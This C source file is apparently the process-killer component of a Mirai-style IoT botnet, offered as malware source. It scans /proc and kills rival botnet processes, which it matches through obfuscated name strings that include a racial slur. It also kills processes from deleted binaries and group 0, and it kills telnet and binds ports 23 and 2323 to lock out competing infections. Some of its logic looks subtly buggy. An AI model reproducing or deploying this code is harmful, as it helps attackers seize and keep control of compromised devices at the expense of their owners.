#define _GNU_SOURCE
#include <stdio.h>
#include <dirent.h>
#include <time.h>
#include <fcntl.h>
#include <netdb.h>
#include <sys/wait.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <ctype.h>
#include "headers/connection.h"
#include "headers/killer.h"
#include "headers/util.h"
char pidPath[512];
int max_push_counter = 0, rp_len, fd, killer_pid, current_protect_values;
int TotalKilled;
int TotalSaved;
char killer_realpath[25];
char killedName[512];
#include "headers/encryption.h"
// ports to bind to
void util_memcpy(void *dst, void *src, int len)
{
    char *r_dst = (char *)dst;
    char *r_src = (char *)src;
    while (len--)
        *r_dst++ = *r_src++;
}
int util_strlen(char *str)
{
    int c = 0;

    while (*str++ != 0)
        c++;
    return c;
}
int util_strcpy(char *dst, char *src)
{
    int l = util_strlen(src);

    util_memcpy(dst, src, l + 1);

    return l;
}
char *portValue[] = {
    "23",
    "2323",
};

int scan_maps(char *buf, int pid)
{
    char enc_dv[] = {"gyuKhoshu"}; // dvrHelper
    char enc_mi[] = {"pludl"};     // mirai
    char enc_bl[] = {"eodgh"};     // blade
    char enc_de[] = {"ghprq"};     // demon
    char enc_ho[] = {"krkr"};      // hoho
    char enc_ha[] = {"kdndl"};     // hakai
    char enc_mio[] = {"plrul"};    // miori
    char enc_lo[] = {"orol"};      // loli
    char enc_da[] = {"gdnx"}; // daku
    char enc_hi[] = {"klwr"}; // hito
    char enc_ni[] = {"qljjhu"}; // nigger
    char enc_ko[] = {"nrzdl"}; // kowai
    char enc_st[] = {"vwrup"}; // storm
    util_encryption(enc_dv);
    util_encryption(enc_mi);
    util_encryption(enc_bl);
    util_encryption(enc_de);
    util_encryption(enc_ho);
    util_encryption(enc_ha);
    util_encryption(enc_mio);
    util_encryption(enc_lo);
    util_encryption(enc_da);
    util_encryption(enc_hi);
    util_encryption(enc_ni);
    util_encryption(enc_ko);
    util_encryption(enc_st);
    if(strstr(buf, enc_dv)) 
    { 
        return 1; 
    }
    else if(strstr(buf, enc_mi)) 
    { 
        return 1; 
    }
    else if(strstr(buf, enc_bl)) 
    {
        return 1; 
    }
    else if(strstr(buf, enc_de)) 
    { 
        return 1; 
    }
    else if(strstr(buf, enc_ho)) 
    { 
        return 1; 
    }
    else if(strstr(buf, enc_ha)) 
    { 
        return 1; 
    }
    else if(strstr(buf, enc_mio))
    { 
        return 1; 
    }
    else if(strstr(buf, enc_lo)) 
    { 
        return 1; 
    }
    else if(strstr(buf, enc_da))
    { 
        return 1; 
    }
    else if(strstr(buf, enc_hi))
    { 
        return 1; 
    }
    else if(strstr(buf, enc_ni))
    { 
        return 1; 
    }
    else if(strstr(buf, enc_ko))
    { 
        return 1; 
    }
    else if(strstr(buf, enc_st))
    { 
        return 1; 
    }
    return 0;
}

void killer_init(void)
{
    int killer_highest_pid = 400, last_pid_scan = time(NULL);
    uint32_t scan_counter = 0;
    killer_pid = fork();
    if(killer_pid > 0 || killer_pid == -1)
    {
        return;
    }
    char enc_proc[] = {"2surf2"}; // /proc/
    char enc_maps[] = {"2pdsv"}; // /maps
    util_encryption(enc_proc);
    util_encryption(enc_maps);
    while(1)
    {
        DIR *dir;
        struct dirent *file;
        if((dir = opendir(enc_proc)) == NULL)
        {
            break;
        }
        while((file = readdir(dir)) != NULL)
        {
            if(*(file->d_name) < '0' || *(file->d_name) > '9')
            {
                continue;
            }
            char maps_path[64], *ptr_maps_path = maps_path;
            int rp_len = 0, fd = 0, pid = atoi(file->d_name);
            scan_counter++;
            if(pid <= killer_highest_pid)
            {
                if(time(NULL) - last_pid_scan > 5)
                {
                    killer_highest_pid = 400;
                }
                else
                {
                    if(pid > 400 && scan_counter % 10 == 0)
                    {
                        sleep(1);
                    }
                }
                continue;
            }
            if(pid > killer_highest_pid)
            {
                killer_highest_pid = pid;
            }
            last_pid_scan = time(NULL);
            ptr_maps_path += sprintf(ptr_maps_path, "%s", enc_proc);
            ptr_maps_path += sprintf(ptr_maps_path, "%s", file->d_name);
            ptr_maps_path += sprintf(ptr_maps_path, "%s", enc_maps);
            if(pid == getpid() || pid == getppid() || pid == killer_pid || pid == telnet_pid || pid == exploit_pid)
            {
                continue;
            }
            else
            {
                int fd = 0, ret = 0;
                char buffer[4096];
                if(fd = open(maps_path, O_RDONLY) == -1)
                {
                    continue;
                }
                while(ret = read(fd, buffer, sizeof(buffer)) > 0) 
                {
                    if(scan_maps(buffer, pid) > 0)
                    {
                        kill(pid, 9);
                        break;
                    }
                    else
                    {
                        break;
                    }
                }
                close(fd);
                memset(buffer, 0, sizeof buffer);
                continue;
            }
            memset(maps_path, 0, sizeof maps_path);
        }
        closedir(dir);
        scan_counter = 0;
        sleep(1);
    }
}

void killer_kill(void)
{
    kill(killer_pid, 9);
}

// main killing function to initialise our other functions
void killer() {
    int i, childpid;

    childpid = fork();

    if(childpid > 0 || childpid == 1)
    {
        return;
    }

    killer_pid = getpid();
    killer_save_by_sysproc();

    killer_kill_by_service(encrypter[0].decrypt);
    killer_kill_by_deleted();
  //  killer_kill_by_array();
  //  killer_bind_by_port(atoi(portValue[i]));
    while(1)
    {
     
        killer_kill_by_group();
    
        usleep(10);
    }
}

void read_pid_name(char proc[512]) {
    int proc1 = 0;
    proc1 = open(proc, O_RDONLY);
    read(proc1, pidPath, sizeof(pidPath));

    close(proc1);

}

void killer_kill_by_deleted() {
    DIR *dir;
    struct dirent *file;

#ifdef DEBUG
                printf("[KILLER] finding unlinked binaries\n");
#endif
                dir = opendir(encrypter[7].decrypt);
                while(file = readdir(dir)) {
                    char exe_path[100];
                    char *ptr_exe = exe_path;
                    int pid = atoi(file->d_name);
                    ptr_exe += util_strcpy(ptr_exe, encrypter[7].decrypt);
                    ptr_exe += util_strcpy(ptr_exe, file->d_name);
                    ptr_exe += util_strcpy(ptr_exe, encrypter[10].decrypt);
                    
                    read_pid_name(exe_path);

                    if(pid > 0) {
                        if ((rp_len = readlink(exe_path, killer_realpath, sizeof (killer_realpath))) != -1) {
                            if((fd = open(killer_realpath, O_RDONLY)) == -1) {
                                if(strstr(killer_realpath, "(deleted)")) {
                                    if(pid != killer_pid) {

#ifdef DEBUG
                                    printf("[KILLER] found deleted binary! string pid %d\n", pid);
#endif
                                    TotalKilled++;
                                    kill(pid, 9);

                                }

                                memset(exe_path, 0, sizeof(exe_path));


                        }
                    }
                }
            }
        }

    }

/*
void killer_kill_by_array() {
#ifdef DEBUG
                printf("[KILLER] finding proc with matching name of our array\n");
#endif
    int i;
    DIR *dir;
    struct dirent *file;

    dir = opendir(encrypter[7].decrypt);
    while(file = readdir(dir)) {
    char maps_path[100];
    char *ptr_maps = maps_path;
        int pid = atoi(file->d_name);
        ptr_maps += util_strcpy(ptr_maps, encrypter[7].decrypt);
        ptr_maps += util_strcpy(ptr_maps, file->d_name);
        ptr_maps += util_strcpy(ptr_maps, encrypter[9].decrypt);

        read_pid_name(maps_path);
        if(pid > 0) {
            for(i = 0; i < sizeof(array_kill_list) / sizeof(array_kill_list[0]); i++) {
                if(strstr(pidPath, array_kill_list[i])) {
#ifdef DEBUG
                    printf("[KILLER] killed string %s pid %d\n", array_kill_list[i], pid);
#endif
                    TotalKilled++;
                    kill(pid, 9);
                    }

                    memset(maps_path, 0, sizeof(maps_path));
                }
            }
        }

    }
*/

void killer_kill_by_name(char *killstring) {
#ifdef DEBUG
                printf("[KILLER] finding proc string '%s'\n", killstring);
#endif
    DIR *dir;
    struct dirent *file;

    dir = opendir(encrypter[7].decrypt);
    while(file = readdir(dir)) {
    char maps_path[100];
    char *ptr_maps = maps_path;
        int pid = atoi(file->d_name);
        ptr_maps += util_strcpy(ptr_maps, encrypter[7].decrypt);
        ptr_maps += util_strcpy(ptr_maps, file->d_name);
        ptr_maps += util_strcpy(ptr_maps, encrypter[9].decrypt);
        read_pid_name(maps_path);
        if(pid > 0) {
            if(strstr(pidPath, killstring)) {
#ifdef DEBUG
                printf("[KILLER] killed string %s pid %d\n", killstring, pid);
#endif
                TotalKilled++;
                kill(pid, 9);
            }

            memset(maps_path, 0, sizeof(maps_path));

        }
    }

}

void killer_save_by_sysproc() {
    int i = 0;
    #ifdef DEBUG
                    printf("[KILLER] tracking system procs to protect\n");
    #endif
    DIR *dir;
    struct dirent *file;

    dir = opendir(encrypter[7].decrypt);
    while(file = readdir(dir)) {
    char cmdline_path[64], *ptr_cmdline = cmdline_path;

        int pid = atoi(file->d_name);

        ptr_cmdline += util_strcpy(ptr_cmdline, encrypter[7].decrypt);
        ptr_cmdline += util_strcpy(ptr_cmdline, file->d_name);
        ptr_cmdline += util_strcpy(ptr_cmdline, encrypter[9].decrypt);

        read_pid_name(cmdline_path);


        if(pid > 0) {
            if(strstr(pidPath, "bash") || strstr(pidPath, "dropbear") || strstr(pidPath, "encoder") || strstr(pidPath, "ropbear")) {
#ifdef DEBUG
                printf("[KILLER] found sysproc to protect! %s pid %d\n", pidPath, pid);
#endif
                TotalSaved++;
                if(i > MAX_SYSPROCS) {
#ifdef DEBUG
                    printf("[KILLER] max procs to save reached!\n");
#endif
                    break;
            }
            savesysproc[i].save_pid = pid;
            i++;
        }
    }

    memset(cmdline_path, 0, sizeof(cmdline_path));


}

#ifdef DEBUG
    printf("[KILLER] found %d values to protect!\n", i);
#endif
    current_protect_values = i;
    struct save_proc_node savesysproc[current_protect_values];

}

void killer_bind_by_port(int portVal) 
{
    int port_addr_tmp;
    struct sockaddr_in port_addr;

    port_addr.sin_family = AF_INET;
    port_addr.sin_addr.s_addr = INADDR_ANY;
    port_addr.sin_port = htons(portVal);


    if((port_addr_tmp = socket(AF_INET, SOCK_STREAM, 0)) != -1) 
    {
        if(bind(port_addr_tmp, (struct sockaddr *) &port_addr, sizeof(struct sockaddr_in)) > -1) 
        {
            listen(port_addr_tmp, 1);
#ifdef DEBUG
            printf("[KILLER] bound to port %d\n", portVal);
#endif
        }
    else
    {
#ifdef DEBUG
            printf("[KILLER] could not bind to port %d\n", portVal);
#endif
       }
    }
}

void pid_to_name(char *procPid) {
    DIR *dir;
    struct dirent *file;

    dir = opendir(encrypter[7].decrypt);

    while(file = readdir(dir)) {
        char readPid[64], *ptr_readPid = readPid;
        int pid = atoi(file->d_name);
        ptr_readPid += util_strcpy(ptr_readPid, encrypter[7].decrypt);
        ptr_readPid += util_strcpy(ptr_readPid, procPid);
        ptr_readPid += util_strcpy(ptr_readPid, encrypter[9].decrypt);
        int proc1 = 0;
        proc1 = open(readPid, O_RDONLY);
        read(proc1, killedName, sizeof(killedName));
        memset(readPid, 0, sizeof(readPid));
    }


}
// really smart kills all processes that are in group 0 system put all important system processes in a group so we only kill what we should kill
void killer_kill_by_group() {
    int i;
    char status_path[512];
    char *ptr_status = status_path;
    DIR *dir;
    struct dirent *file;

    dir = opendir(encrypter[7].decrypt);
    while(file = readdir(dir)) {
        int pid = atoi(file->d_name);
        char status_path[512];
        char *ptr_status = status_path;
        ptr_status += util_strcpy(ptr_status, encrypter[7].decrypt);
        ptr_status += util_strcpy(ptr_status, file->d_name);
        ptr_status += util_strcpy(ptr_status, encrypter[10].decrypt);

        read_pid_name(status_path);

        if(pid > 0) {
            if(strstr(pidPath, "Groups:\t0")) {
                if(pid == getpid() || pid == getppid())
                {
                    continue;
                }
                if(pid != savesysproc[0].save_pid && pid != savesysproc[1].save_pid && pid != savesysproc[2].save_pid && pid != savesysproc[3].save_pid && pid != savesysproc[4].save_pid && pid != savesysproc[6].save_pid && pid != savesysproc[7].save_pid && pid != savesysproc[8].save_pid && pid != savesysproc[9].save_pid && pid != savesysproc[10].save_pid && pid != killer_pid) {
                    //pid_to_name(pid);
#ifdef DEBUG
                    printf("[AGRESSIVE-KILLER] killed process pid %d\n", pid);
#endif
                    TotalKilled++;
                    kill(pid, 9);
                }
            }
        }
        memset(status_path, 0, sizeof(status_path));
    }
    closedir(dir);
}

// kill telnet service to prevent other malware to infect us
void killer_kill_by_service(char *killstring) 
{
    int i;
    #ifdef DEBUG
                    printf("[KILLER] finding service by name '%s'\n", killstring);
    #endif
    DIR *dir;
    struct dirent *file;

    dir = opendir(encrypter[7].decrypt);
    while(file = readdir(dir)) 
    {
        char cmdline_path[100];
        char *ptr_cmdline = cmdline_path;
        int pid = atoi(file->d_name);
        ptr_cmdline += util_strcpy(ptr_cmdline, encrypter[7].decrypt);
        ptr_cmdline += util_strcpy(ptr_cmdline, file->d_name);
        ptr_cmdline += util_strcpy(ptr_cmdline, encrypter[9].decrypt);
        read_pid_name(cmdline_path);

        if(pid > 0) 
        {
            if(strstr(pidPath, killstring)) 
            {
#ifdef DEBUG
                printf("[KILLER] killed service %s pid %d\n", killstring, pid);
#endif
                TotalKilled++;
                kill(pid, 9);
                for(i = 0; i < sizeof(portValue) / sizeof(portValue[0]); i ++) 
                {
                    killer_bind_by_port(atoi(portValue[i]));
                    
                }
            }
        }
        memset(cmdline_path, 0, sizeof(cmdline_path));
    }

}

void killer_total_killed() {
#ifdef DEBUG
    printf("[KILLER] killed %d and saved %d in total\n", TotalKilled, TotalSaved);
#endif
}
